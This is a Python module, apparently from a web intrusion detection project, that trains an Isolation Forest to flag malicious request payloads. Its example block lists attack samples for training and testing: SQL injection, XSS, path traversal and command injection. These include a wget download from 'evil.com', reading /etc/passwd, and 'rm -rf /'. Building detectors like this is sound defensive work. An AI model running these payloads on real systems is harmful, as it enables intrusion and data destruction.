"""
Sentinel ML Engine v2.0 - ML Model (Layer 2)
Isolation Forest for anomaly detection on enhanced features
"""

import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import pickle
import os
import config
from features import extract_all_features, get_feature_names, features_to_vector


class MLAnomalyDetector:
    """
    Layer 2: Machine Learning anomaly detection
    Uses Isolation Forest on 60+ features
    """
    
    def __init__(self, model_path=None):
        """
        Initialize ML detector
        
        Args:
            model_path: Path to saved model (if None, creates new model)
        """
        self.feature_names = get_feature_names()
        self.model = None
        self.scaler = StandardScaler()
        self.is_trained = False
        
        if model_path and os.path.exists(model_path):
            self.load_model(model_path)
        else:
            # Create new model
            self.model = IsolationForest(
                contamination=config.ISOLATION_FOREST_CONTAMINATION,
                n_estimators=config.ISOLATION_FOREST_N_ESTIMATORS,
                random_state=config.RANDOM_STATE,
                n_jobs=-1  # Use all CPU cores
            )
        
        self.stats = {
            'total_predictions': 0,
            'anomalies_detected': 0,
        }
    
    def train(self, payloads, labels=None):
        """
        Train the model on a dataset of payloads
        
        Args:
            payloads: List of payload strings
            labels: Optional list of labels (1=malicious, 0=benign) for evaluation
        
        Returns:
            dict: Training statistics
        """
        print(f"[INFO] Extracting features from {len(payloads)} payloads...")
        
        # Extract features
        X = []
        for i, payload in enumerate(payloads):
            if i % 100 == 0:
                print(f"  Progress: {i}/{len(payloads)}")
            
            features = extract_all_features(payload)
            feature_vector = features_to_vector(features, self.feature_names)
            X.append(feature_vector)
        
        X = np.array(X)
        
        print(f"[INFO] Feature matrix shape: {X.shape}")
        print(f"[INFO] Features: {len(self.feature_names)}")
        
        # Normalize features
        print("[INFO] Normalizing features...")
        X_scaled = self.scaler.fit_transform(X)
        
        # Train Isolation Forest
        print("[INFO] Training Isolation Forest...")
        self.model.fit(X_scaled)
        self.is_trained = True
        
        print("[SUCCESS] Model trained successfully!")
        
        # Evaluate if labels provided
        if labels is not None:
            predictions = self.model.predict(X_scaled)
            # Isolation Forest: -1 = anomaly, 1 = normal
            # Convert to: 1 = malicious, 0 = benign
            predictions_binary = [1 if p == -1 else 0 for p in predictions]
            
            # Calculate metrics
            from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score
            
            accuracy = accuracy_score(labels, predictions_binary)
            precision = precision_score(labels, predictions_binary, zero_division=0)
            recall = recall_score(labels, predictions_binary, zero_division=0)
            f1 = f1_score(labels, predictions_binary, zero_division=0)
            
            stats = {
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'f1_score': f1,
                'samples': len(payloads)
            }
            
            print(f"\n[EVALUATION]")
            print(f"  Accuracy:  {accuracy:.3f}")
            print(f"  Precision: {precision:.3f}")
            print(f"  Recall:    {recall:.3f}")
            print(f"  F1 Score:  {f1:.3f}")
            
            return stats
        
        return {'samples': len(payloads)}
    
    def predict(self, payload):
        """
        Predict if payload is anomalous (potentially malicious)
        
        Args:
            payload: String payload to analyze
        
        Returns:
            dict: {
                'is_malicious': bool,
                'confidence': float (0-1),
                'anomaly_score': float,
                'features': dict
            }
        """
        if not self.is_trained:
            raise ValueError("Model not trained! Call train() or load_model() first.")
        
        self.stats['total_predictions'] += 1
        
        # Extract features
        features = extract_all_features(payload)
        feature_vector = features_to_vector(features, self.feature_names)
        
        # Normalize
        X = np.array([feature_vector])
        X_scaled = self.scaler.transform(X)
        
        # Predict
        prediction = self.model.predict(X_scaled)[0]  # -1 or 1
        
        # Get anomaly score (more negative = more anomalous)
        anomaly_score = self.model.score_samples(X_scaled)[0]
        
        # Convert to confidence (0-1)
        # Anomaly score is typically between -0.5 and 0.5
        # More negative = more anomalous = higher confidence of maliciousness
        confidence = max(0.0, min(1.0, (-anomaly_score + 0.5)))
        
        is_malicious = prediction == -1
        
        if is_malicious:
            self.stats['anomalies_detected'] += 1
        
        return {
            'is_malicious': is_malicious,
            'confidence': confidence if is_malicious else 0.0,
            'anomaly_score': float(anomaly_score),
            'features': features,
            'layer': 'ML Anomaly Detection (Layer 2)'
        }
    
    def save_model(self, model_path=None, scaler_path=None):
        """Save trained model and scaler to disk"""
        if model_path is None:
            model_path = config.MODEL_PATH
        if scaler_path is None:
            scaler_path = config.SCALER_PATH
        
        # Create directory if needed
        os.makedirs(os.path.dirname(model_path), exist_ok=True)
        
        # Save model
        with open(model_path, 'wb') as f:
            pickle.dump(self.model, f)
        
        # Save scaler
        with open(scaler_path, 'wb') as f:
            pickle.dump(self.scaler, f)
        
        print(f"[SUCCESS] Model saved to {model_path}")
        print(f"[SUCCESS] Scaler saved to {scaler_path}")
    
    def load_model(self, model_path=None, scaler_path=None):
        """Load trained model and scaler from disk"""
        if model_path is None:
            model_path = config.MODEL_PATH
        if scaler_path is None:
            scaler_path = config.SCALER_PATH
        
        # Load model
        with open(model_path, 'rb') as f:
            self.model = pickle.load(f)
        
        # Load scaler
        with open(scaler_path, 'rb') as f:
            self.scaler = pickle.load(f)
        
        self.is_trained = True
        print(f"[SUCCESS] Model loaded from {model_path}")
        print(f"[SUCCESS] Scaler loaded from {scaler_path}")
    
    def get_stats(self):
        """Return prediction statistics"""
        return {
            'total_predictions': self.stats['total_predictions'],
            'anomalies_detected': self.stats['anomalies_detected'],
            'anomaly_rate': self.stats['anomalies_detected'] / self.stats['total_predictions']
                           if self.stats['total_predictions'] > 0 else 0.0
        }


# Example usage
if __name__ == "__main__":
    print("="*80)
    print("ML ANOMALY DETECTOR TEST")
    print("="*80)
    
    # Create detector
    detector = MLAnomalyDetector()
    
    # Training data (mix of benign and malicious)( for individual testing, not for actual training)
    training_payloads = [
        # Benign traffic
        "GET /index.html HTTP/1.1",
        "GET /about.html HTTP/1.1",
        "GET /contact.html HTTP/1.1",
        "POST /api/search?query=python tutorials",
        "GET /images/logo.png HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "POST /api/login username=john&password=secret",
        "GET /blog/2024/01/article HTTP/1.1",
        "GET /products?category=electronics HTTP/1.1",
        "POST /api/comment content=Great article!",
        
        # Malicious traffic (SQL Injection)
        "admin' OR '1'='1'--",
        "' UNION SELECT password FROM users--",
        "'; DROP TABLE users--",
        "1' AND 1=1--",
        "' OR 'a'='a",
        
        # Malicious traffic (XSS)
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='evil.com'></iframe>",
        
        # Malicious traffic (Command Injection)
        "; cat /etc/passwd",
        "| ls -la /root",
        "&& whoami",
        "`wget evil.com/malware`",
        
        # Malicious traffic (Path Traversal)
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "/etc/passwd%00.jpg",
    ]
    
    # Labels (1 = malicious, 0 = benign)
    labels = [0]*10 + [1]*19  # First 10 benign, rest malicious
    
    print(f"\n[INFO] Training on {len(training_payloads)} samples...")
    print(f"  Benign: {labels.count(0)}")
    print(f"  Malicious: {labels.count(1)}")
    
    # Train
    stats = detector.train(training_payloads, labels=labels)
    
    # Save model
    detector.save_model()
    
    # Test predictions
    print("\n" + "="*80)
    print("TESTING PREDICTIONS")
    print("="*80)
    
    test_cases = [
        ("Normal request", "GET /products HTTP/1.1", False),
        ("SQL Injection", "admin' OR 1=1--", True),
        ("XSS Attack", "<script>document.cookie</script>", True),
        ("Normal search", "search?q=machine learning", False),
        ("Command Injection", "; rm -rf /", True),
    ]
    
    for name, payload, expected_malicious in test_cases:
        result = detector.predict(payload)
        
        status = "✓" if result['is_malicious'] == expected_malicious else "✗"
        
        print(f"\n{status} {name}:")
        print(f"  Payload: {payload}")
        print(f"  Malicious: {result['is_malicious']} (confidence: {result['confidence']:.3f})")
        print(f"  Anomaly Score: {result['anomaly_score']:.3f}")
    
    # Stats
    print("\n" + "="*80)
    print("STATISTICS:")
    stats = detector.get_stats()
    print(f"Total Predictions: {stats['total_predictions']}")
    print(f"Anomalies Detected: {stats['anomalies_detected']}")
    print(f"Anomaly Rate: {stats['anomaly_rate']:.1%}")
    print("="*80)
